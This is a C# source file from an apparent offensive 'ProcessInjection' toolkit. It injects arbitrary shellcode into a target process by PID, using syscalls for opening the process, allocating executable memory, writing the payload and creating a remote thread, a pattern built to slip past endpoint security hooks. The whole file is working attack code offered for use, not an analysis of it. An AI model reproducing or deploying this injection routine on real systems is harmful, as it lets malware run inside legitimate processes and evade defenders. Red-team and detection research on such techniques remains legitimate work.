using ProcessInjection.DirectSyscalls;
using ProcessInjection.Native;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static ProcessInjection.Native.Enum;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Delegates;
using static ProcessInjection.Utils.Utils;

namespace ProcessInjection.IndirectSyscalls
{
    public class CreateRemoteThread
    {
        public static void InDirectSyscallCreateRemoteThread(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;

                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                //IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                IntPtr pHandle = IntPtr.Zero;
                CLIENT_ID client_id = new CLIENT_ID { UniqueProcess = (IntPtr)pid, UniqueThread = IntPtr.Zero };
                OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
                var NtOpenProcessRes = Syscalls.NtOpenProcess(ref pHandle, (uint)ProcessAccessRights.All, ref objAttr, ref client_id);
                if (NtOpenProcessRes != NTSTATUS.Success)
                {
                    PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
                }

                PrintInfo($"[!] Allocating memory to inject the shellcode.");
                IntPtr rMemAddress = new IntPtr();
                IntPtr pZeroBits = IntPtr.Zero;
                IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(buf.Length));
                uint allocationType = (uint)MemAllocation.MEM_COMMIT | (uint)MemAllocation.MEM_RESERVE;
                uint protection = (uint)MemProtect.PAGE_EXECUTE_READWRITE;
                var NtAllocateVirtualMemoryRes = Syscalls.NtAllocateVirtualMemory(pHandle, ref rMemAddress, pZeroBits, ref pAllocationSize, allocationType, protection);
                if (NtAllocateVirtualMemoryRes != NTSTATUS.Success)
                {
                    PrintError($"[-] Failed to allocate memory for the shellcode");
                }
                else
                {
                    PrintInfo($"[!] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
                }

                PrintInfo($"[!] Writing the shellcode at the allocated memory location.");

                var NtWriteVirtualMemoryRes = Syscalls.NtWriteVirtualMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten);
                if (NtWriteVirtualMemoryRes != NTSTATUS.Success)
                {
                    PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintInfo($"[!] Shellcode written in the process memory.");
                }

                PrintInfo($"[!] Creating remote thread to execute the shellcode.");

                IntPtr hThread = new IntPtr(0);
                ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
                IntPtr pObjectAttributes = new IntPtr(0);
                IntPtr lpParameter = new IntPtr(0);
                bool bCreateSuspended = false;
                uint stackZeroBits = 0;
                uint sizeOfStackCommit = 0xFFFF;
                uint sizeOfStackReserve = 0xFFFF;
                IntPtr pBytesBuffer = new IntPtr(0);

                var NtCreateThreadExRes = Syscalls.NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, pHandle, rMemAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);

                if (NtCreateThreadExRes != NTSTATUS.Success)
                {
                    PrintError($"[-] Failed to create new thread.");
                }
                else
                {
                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }

                bool hCreateRemoteThreadClose = Win32API.CloseHandle(hThread);
                bool hOpenProcessClose = Win32API.CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
        }
    }
}
